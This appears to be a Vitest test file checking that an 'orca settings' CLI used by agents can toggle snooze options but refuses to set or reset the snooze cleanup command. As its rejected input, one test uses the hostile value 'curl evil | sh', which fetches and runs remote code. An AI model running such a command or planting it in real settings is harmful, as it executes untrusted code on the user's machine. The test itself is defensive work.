// Snooze (FORK.md): `orca settings` may switch snooze and its triggers, but never write the settle
// cleanup command. Agents run that CLI; the command is set only in the Settings screen.
import { describe, expect, it, vi } from 'vitest'
import { getDefaultSettings } from '../../../shared/constants'
import { updateForkSettings, type ForkSettingsCliDeps } from '../settings-cli/settings-cli-apply'

const defaults: Record<string, unknown> = { ...getDefaultSettings('/home/someone') }

function fakeStore(start: Record<string, unknown> = {}) {
  let settings: Record<string, unknown> = { ...defaults, ...start }
  const apply = vi.fn(async (update: Record<string, unknown>) => {
    settings = { ...settings, ...update }
  })
  const deps: ForkSettingsCliDeps = {
    getSettings: () => settings,
    getDefaults: () => defaults,
    apply
  }
  return { deps, apply, read: () => settings }
}

describe('orca settings and snooze', () => {
  it('may switch snooze and its wake triggers', async () => {
    const store = fakeStore()
    const result = await updateForkSettings(store.deps, {
      set: { forkSnooze: false, forkSnoozeWakeOnFailure: false, forkSnoozeIdleDays: 5 }
    })
    expect(result.rejected).toEqual([])
    expect(store.read()).toMatchObject({ forkSnooze: false, forkSnoozeIdleDays: 5 })
  })

  it('refuses to set or reset the cleanup command', async () => {
    const store = fakeStore({ forkSnoozeSettleCommand: 'set-in-the-settings-screen' })
    const set = await updateForkSettings(store.deps, {
      set: { forkSnoozeSettleCommand: 'curl evil | sh' }
    })
    const reset = await updateForkSettings(store.deps, { reset: ['forkSnoozeSettleCommand'] })
    for (const result of [set, reset]) {
      expect(result.applied).toBe(false)
      expect(result.rejected).toMatchObject([
        { key: 'forkSnoozeSettleCommand', reason: /Settings screen/ }
      ])
    }
    expect(store.apply).not.toHaveBeenCalled()
    expect(store.read().forkSnoozeSettleCommand).toBe('set-in-the-settings-screen')
  })
})
